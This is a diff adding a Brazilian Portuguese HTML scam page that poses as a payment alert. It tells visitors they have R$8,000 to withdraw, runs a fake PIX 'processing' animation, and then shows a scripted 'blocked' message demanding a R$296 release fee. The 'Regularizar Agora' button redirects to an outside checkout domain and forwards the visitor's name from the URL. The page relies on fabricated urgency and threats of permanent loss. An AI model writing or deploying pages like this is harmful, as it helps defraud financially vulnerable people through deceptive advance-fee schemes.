@@ -1,0 +1,120 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Alerta de Pagamento</title>
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Sharp" rel="stylesheet">
+    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
+    <script>
+        localStorage.setItem("upsell", "up11")
+        tailwind.config = {
+            theme: {
+                extend: {
+                    backgroundImage: {
+                        'page-bg': "linear-gradient(90deg, #015ea2, #1875a7, #2586a7, #3498a8)",
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+
+<body class="bg-page-bg font-sans">
+    <!-- NAVBAR -->
+    <nav class="flex justify-between items-center bg-white px-4 py-3 shadow-md">
+        <img src="images/tele1.webp" class="h-[3vh]" alt="Logo Central">
+        <div></div>
+        <div class="flex items-center gap-1.5 bg-[#165DA9] p-1 rounded-md justify-center">
+            <span class="material-symbols-sharp text-white text-[24px]">person</span>
+            <h4 class="text-white font-semibold text-[14px]" id="userName">Name</h4>
+        </div>
+    </nav>
+
+    <!-- CONTEÚDO -->
+    <div class="max-w-[500px] mx-auto mt-12 px-4 text-center">
+        <div class="bg-white p-6 rounded-xl shadow-lg">
+            <h3 class="text-red-600 text-lg font-bold mb-4">🚨 ALERTA: SEU SAQUE ESTÁ BLOQUEADO! 🚨</h3>
+            <p class="mb-4">
+                Uma <b>pendência urgente</b> está impedindo a liberação do seu pagamento. Se não for resolvido
+                <b>imediatamente</b>, o sistema pode <b>cancelar automaticamente</b> a transação, resultando na
+                <b>perda definitiva do seu valor</b>.
+            </p>
+
+            <!-- Valor Saque -->
+            <div id="valorSaque" class="hidden bg-green-100 border border-green-400 text-green-800 text-sm p-4 rounded mb-4">
+                💰 Você tem disponível para saque: <b>R$8.000,00</b>
+                <br><br>
+                <button id="btnConfirmarSaque" class="w-full bg-[#165DA9] hover:bg-blue-700 text-white text-lg font-semibold py-2 px-4 rounded">
+                    Confirmar Saque
+                </button>
+            </div>
+
+            <!-- Botão Inicial -->
+            <button id="btnSacar" class="w-full bg-[#165DA9] hover:bg-blue-700 text-white text-lg font-semibold py-2 px-4 rounded">
+                Clique aqui para sacar seu valor
+            </button>
+
+            <!-- Loading -->
+            <div id="loading" class="hidden mt-4 text-center text-lg">
+                <div class="border-4 border-blue-200 border-t-[#165DA9] rounded-full w-8 h-8 mx-auto animate-spin mb-2">
+                </div>
+                <p>Realizando saque para o PIX...</p>
+            </div>
+
+            <!-- Mensagem Bloqueio -->
+            <div id="mensagemBloqueio" class="hidden mt-4 bg-red-100 border border-red-400 text-red-800 text-sm p-4 rounded">
+                ❌ <b>Erro ao processar o saque!</b><br>
+                O valor foi bloqueado pois a análise detectou que seu histórico indicava um possível endividamento. Como
+                agora você está para receber um valor alto, é necessário pagar uma taxa de liberação de <b>R$ 296,00</b> para
+                confirmar sua identidade e liberar o pagamento.
+                <br><br>
+                <button onclick="redirect(event)" class="w-full bg-red-600 hover:bg-red-700 text-white text-lg font-semibold py-2 px-4 rounded">
+                    Regularizar Agora
+                </button>
+            </div>
+            <p class="text-red-600 font-bold mt-4 text-sm">
+                ⚠️ Atenção: Após o prazo, a regularização será irreversível.
+            </p>
+        </div>
+    </div>
+
+    <script>
+        function redirect(event) {
+            event.preventDefault()
+            var currentUrlParams = window.location.search
+            window.location.href = "https://pagamentooficial.sbs/checkout/up-9/" + currentUrlParams
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            const urlParams = new URLSearchParams(window.location.search)
+            const fullName = urlParams.get("name")
+
+            if (fullName) {
+                const firstName = fullName.trim().split(" ")[0]
+                const formattedName = firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase()
+                const userNameElement = document.getElementById("userName")
+                if (userNameElement) {
+                    userNameElement.textContent = formattedName
+                }
+            }
+        })
+
+        document.getElementById("btnSacar").addEventListener("click", function () {
+            document.getElementById("btnSacar").classList.add("hidden")
+            document.getElementById("valorSaque").classList.remove("hidden")
+        })
+
+        document.getElementById("btnConfirmarSaque").addEventListener("click", function () {
+            document.getElementById("valorSaque").classList.add("hidden")
+            document.getElementById("loading").classList.remove("hidden")
+
+            setTimeout(function () {
+                document.getElementById("loading").classList.add("hidden")
+                document.getElementById("mensagemBloqueio").classList.remove("hidden")
+            }, 3000)
+        })
+    </script>
+
+
+</body></html>
